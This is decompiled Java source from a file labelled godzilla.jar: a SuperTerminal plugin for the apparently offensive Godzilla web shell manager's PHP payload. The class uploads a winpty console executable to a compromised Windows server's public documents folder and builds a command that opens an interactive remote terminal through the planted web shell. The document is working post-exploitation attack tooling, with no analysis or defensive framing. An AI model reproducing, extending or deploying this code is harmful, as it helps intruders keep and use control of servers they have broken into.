/*    */ package shells.plugins.php;
/*    */ 
/*    */ import core.EasyI18N;
/*    */ import core.annotation.PluginAnnotation;
/*    */ import core.ui.component.dialog.GOptionPane;
/*    */ import shells.plugins.generic.RealCmd;
/*    */ import shells.plugins.generic.SuperTerminal;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "SuperTerminal", DisplayName = "超级终端")
/*    */ public class PSuperTerminal
/*    */   extends SuperTerminal
/*    */ {
/*    */   public RealCmd getRealCmd() {
/* 21 */     RealCmd plugin = (RealCmd)this.shellEntity.getFrame().getPlugin("RealCmd");
/* 22 */     if (plugin != null) {
/* 23 */       return plugin;
/*    */     }
/* 25 */     GOptionPane.showMessageDialog(getView(), "未找到HttpProxy插件!", "提示", 0);
/*    */     
/* 27 */     return null;
/*    */   }
/*    */ 
/*    */   
/*    */   public boolean winptyInit(String tmpCommand) throws Exception {
/* 32 */     boolean superRet = super.winptyInit(tmpCommand);
/* 33 */     if (superRet) {
/* 34 */       String winptyFileName = String.format("%swinpty-%s.exe", new Object[] { getTempDirectory(), "Console-x" + (this.payload.isX64() ? 64 : 32) });
/* 35 */       if (this.payload.getFileSize(winptyFileName) <= 0) {
/* 36 */         Log.log(EasyI18N.getI18nString("上传PtyOfConsole remoteFile->%s"), new Object[] { winptyFileName });
/* 37 */         if (this.payload.uploadFile(winptyFileName, functions.readInputStreamAutoClose(SuperTerminal.class.getResourceAsStream(String.format("assets/winptyConsole-x%d.exe", new Object[] { Integer.valueOf(this.payload.isX64() ? 64 : 32) }))))) {
/* 38 */           Log.log(EasyI18N.getI18nString("上传PtyOfConsole成功!"), new Object[0]);
/* 39 */           String[] commands = functions.SplitArgs(tmpCommand);
/* 40 */           this.realCmdCommand = String.format("%s %s", new Object[] { winptyFileName, commands[1] });
/* 41 */           Log.log(EasyI18N.getI18nString("WinPty 派生命令->%s"), new Object[] { this.realCmdCommand });
/* 42 */           return true;
/*    */         } 
/*    */       } else {
/* 45 */         Log.log(EasyI18N.getI18nString("已有winpty console 无需再次上传"), new Object[0]);
/*    */       } 
/*    */     } 
/* 48 */     return superRet;
/*    */   }
/*    */ 
/*    */   
/*    */   protected String getTempDirectory() {
/* 53 */     if (this.payload.isWindows()) {
/* 54 */       return "C:/Users/Public/Documents/";
/*    */     }
/* 56 */     return super.getTempDirectory();
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\PSuperTerminal.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */